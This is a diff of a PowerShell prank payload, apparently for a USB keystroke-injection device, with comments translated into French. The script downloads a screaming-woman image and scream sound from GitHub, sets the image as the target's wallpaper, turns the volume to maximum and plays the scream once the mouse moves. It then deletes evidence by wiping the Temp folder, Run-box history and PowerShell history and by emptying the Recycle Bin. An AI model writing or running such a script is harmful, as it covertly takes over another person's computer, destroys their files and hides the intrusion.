@@ -1,5 +1,4 @@
-# Download Image; replace link to $image to add your own image
-
+# Telechargement de l'image
 $RI = Get-Random @(1..3)
 
 $image =  "https://github.com/PommeDAPI7749/USBPranks/blob/main/windows/screamer/woman-screaming.png?raw=true"
@@ -8,35 +7,27 @@ $i = -join($image,"?dl=1")
 
 iwr $i -O $env:TMP\i.png
 
-# Download WAV file; replace link to $wav to add your own sound
-
+# Telechargement du son
 $wav = "https://github.com/PommeDAPI7749/USBPranks/blob/main/windows/screamer/scream.wav?raw=true"
 
 $w = -join($wav,"?dl=1")
 iwr $w -O $env:TMP\s.wav
 
-
-
 #----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This will take the image you downloaded and set it as the targets wall paper
-#>
-
+# Fonction qui met l'image en fond d'ecran
 Function Set-WallPaper {
  
 <#
  
     .SYNOPSIS
-    Applies a specified wallpaper to the current user's desktop
+    Met une image en fond d'ecran du bureau de l'utilisateur en cours
     
     .PARAMETER Image
-    Provide the exact path to the image
+    Chemin vers l'image
  
     .PARAMETER Style
-    Provide wallpaper style (Example: Fill, Fit, Stretch, Tile, Center, or Span)
+    Fill, Fit, Stretch, Tile, Center, or Span
   
     .EXAMPLE
     Set-WallPaper -Image "C:\Wallpaper\Default.jpg"
@@ -101,22 +92,17 @@ public class Params
   
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
- 
+
 #----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to pause the script until a mouse movement is detected
-#>
-
+# Met le script en pause tant que la souris est imobile
 function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
 $originalPOS = [System.Windows.Forms.Cursor]::Position.X
 $o=New-Object -ComObject WScript.Shell
 
     while (1) {
-        $pauseTime = 3
+        $pauseTime = 1
         if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
             break
         }
@@ -127,19 +113,15 @@ $o=New-Object -ComObject WScript.Shell
 }
 
 #----------------------------------------------------------------------------------------------------
-<#
 
-.NOTES 
-	This is to play the WAV file
-#>
-
+# Joue le son
 function Play-WAV{
 $PlayWav=New-Object System.Media.SoundPlayer;$PlayWav.SoundLocation="$env:TMP\s.wav";$PlayWav.playsync()
 }
 
 #----------------------------------------------------------------------------------------------------
 
-# This turns the volume up to max level
+# Mets le son au maximum
 $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 
 #----------------------------------------------------------------------------------------------------
@@ -150,38 +132,21 @@ Play-WAV
 
 #----------------------------------------------------------------------------------------------------
 
-<#
-
-.NOTES 
-	This is to clean up behind you and remove any evidence to prove you were there
-#>
-
-# Delete contents of Temp folder 
+# Pour effacer les traces
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 #----------------------------------------------------------------------------------------------------
 
-# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+# Controle du caps lock
 
 Add-Type -AssemblyName System.Windows.Forms
 $caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
 
-#If true, toggle CapsLock key, to ensure that the script doesn't fail
 if ($caps -eq $true){
-
 $key = New-Object -ComObject WScript.Shell
 $key.SendKeys('{CapsLock}')
 }
